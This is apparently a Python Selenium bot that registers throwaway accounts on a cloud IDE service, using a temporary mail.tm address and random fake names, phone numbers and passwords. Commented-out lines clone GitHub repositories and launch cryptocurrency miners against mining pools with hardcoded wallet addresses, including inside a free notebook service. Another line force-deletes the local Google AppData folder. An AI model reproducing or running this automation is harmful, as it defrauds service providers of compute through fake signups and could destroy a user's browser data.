

# import os


# os.system('cd.. & cd.. && cd AppData/Local &&  rd /s Google /q && dir')
import string
import random

from selenium import webdriver
from selenium.webdriver.common.by import By
import string
import random
import tkinter as tk
from selenium.webdriver import ActionChains
from lib2to3.pgen2 import driver


from selenium import  webdriver


from selenium.webdriver.common.keys import Keys
option=webdriver.ChromeOptions()
option.add_argument('--disable-blink-features=AutomationControlled')
driver=webdriver.Chrome()
letters = string.ascii_lowercase
# c = webdriver.ChromeOptions()
# c.add_argument("--incognito")

a=ActionChains(driver)
import time

time.sleep(5)
N = 7
 
# using random.choices()
# generating random strings
res = ''.join(random.choices(string.ascii_lowercase +
                             'a', k=N))
 




# driver=webdriver.Chrome()
driver.get('https://mail.tm/en/')


time.sleep(5)

    
def get_random_string(length):
    # choose from all lowercase letter
    letters = string.ascii_lowercase
    result_str = ''.join(random.choice(letters) for i in range(length))
    print("Random string of length", length, "is:", result_str)


driver.find_element(By.XPATH,'//*[@id="DontUseWEBuseAPI"]').click()
window_before = driver.window_handles[0]
root = tk.Tk()
print(root.clipboard_get())
email=root.clipboard_get()
driver.execute_script("window.open('about:blank','secondtab');")
driver.switch_to.window("secondtab")
driver.get('https://atlas.optilogic.app/dashboard/')
time.sleep(80)
print("Found")
driver.find_element(By.XPATH,'/html/body/div/div[2]/div[1]/div/div[1]/span/span').click()
time.sleep(10)
driver.find_element(By.XPATH,'//*[@id="firstName"]').click()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
time.sleep(2)
a.send_keys(randomLetter)
a.send_keys(Keys.TAB).perform()
randomLetter =( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter).perform()
a.send_keys(Keys.TAB).perform()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(email).perform()
numb=random.randint(1000000000,9999999999)
a.send_keys(Keys.TAB).perform()
a.send_keys(numb).perform()
driver.find_element(By.XPATH,'/html/body/div[1]/div[2]/div[1]/span/button[2]').click()
time.sleep(1)
driver.find_element(By.XPATH,'//*[@id="username"]').click()
randomLetter =( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter).perform()
password=randomLetter
a.send_keys(Keys.TAB).perform()
a.send_keys(password).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(password).perform()
driver.find_element(By.XPATH,'/html/body/div[1]/div[2]/div[1]/span/button[3]').click()
time.sleep(1)
driver.find_element(By.XPATH,'//*[@id="user.attributes.companyName"]').click()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter).perform()
a.send_keys(Keys.TAB).perform()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter).perform()
a.send_keys(Keys.TAB).perform()
randomLetter = ( ''.join(random.choice(letters) for i in range(10)) )
a.send_keys(randomLetter).perform()
driver.find_element(By.XPATH,'/html/body/div[1]/div[2]/div[1]/div/div[2]/form/input').click()
driver.switch_to.window(window_before)
time.sleep(8)
driver.find_element(By.XPATH,'//*[@id="__layout"]/div/div[2]/main/div/div[2]/ul/li/a/div/div[1]/div[2]/div[1]').click()
time.sleep(4)
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.TAB).perform()
a.send_keys(Keys.ENTER).perform()
after = driver.window_handles[2]
driver.switch_to.window(after)

time.sleep(50)
driver.find_element(By.XPATH,'//*[@id="page-sidebar"]/div/nav/ul/li[3]').click()
time.sleep(260)


try:
  driver.find_element(By.XPATH,'//*[@id="theia:menubar"]/ul/li[1]/div[2]').click()
except:
  print('i')

try:
  b= driver.find_element(By.XPATH,'//*[@id="theia:menubar"]/ul/li[1]/div[2]')
  a.double_click(b).perform()


except:
    time.sleep(2)
    a.send_keys(Keys.TAB).perform()
    a.send_keys(Keys.TAB).perform()
    a.send_keys(Keys.TAB).perform()
    a.send_keys(Keys.TAB).perform()
    a.send_keys(Keys.TAB).perform()
    a.send_keys(Keys.TAB).perform()
    a.send_keys(Keys.ENTER).perform()
    time.sleep(4)
a.key_down(Keys.ALT).send_keys("N").key_up(Keys.ALT).perform()
a.key_down(Keys.ALT).send_keys("N").key_up(Keys.ALT).perform()


time.sleep(4)
# driver.find_element(By.XPATH,'/html/body/div[5]/ul/li[1]/div[2]').click()













# driver.execute_script("window.open('about:blank','secondtab');")
# driver.switch_to.window("secondtab")



# os.system('git clone https://github.com/dasx436/you.git')

# os.system(' cd you && ./cpuminer-sse2 -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qmrpvzh2fc9zjagylvvaa5mj24a2qrlm823vs6u.suf')

# driver.get("chrome://settings/privacy")
# time.sleep(30)
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()

# a.send_keys(Keys.SPACE).perform()
# a.send_keys(Keys.ARROW_RIGHT).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.SPACE).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.TAB).perform()
# a.send_keys(Keys.SPACE).perform()
# time.sleep(5)

# driver.get("http://netbooks.networkmedicine.org/")
# time.sleep(10)
# driver.find_element(By.XPATH,'//*[@id="insert_above_below"]/button').click()
# time.sleep(5)
# driver.find_element(By.XPATH,'//*[@id="filelink"]').click()
# window_before = driver.window_handles[0]
# time.sleep(5)
# a.send_keys(Keys.TAB).perform()
# time.sleep(5)
# a.send_keys(Keys.SPACE).perform()
# time.sleep(5)


# driver.find_element(By.XPATH,'//*[@id="new-notebook-submenu-bash"]').click()
# time.sleep(7)
# window_after = driver.window_handles[1]

# driver.switch_to.window(window_after)


# time.sleep(3)
# a.send_keys(Keys.ENTER).perform()
# time.sleep(3)
# a.send_keys("git clone https://github.com/dasx436/circle.git && cd circle && chmod +x circleci && ./circleci ann -p pkt1qdn2a6w03fexcwazz7sp8hncdcvrt3hgrj5re06 http://pool.pkteer.com http://pool.pktpool.io https://stratum.zetahash.com ").perform()
# time.sleep(5)
# a.sendKeys(Keys.CONTROL + Keys.ENTER).perform()
# # #'

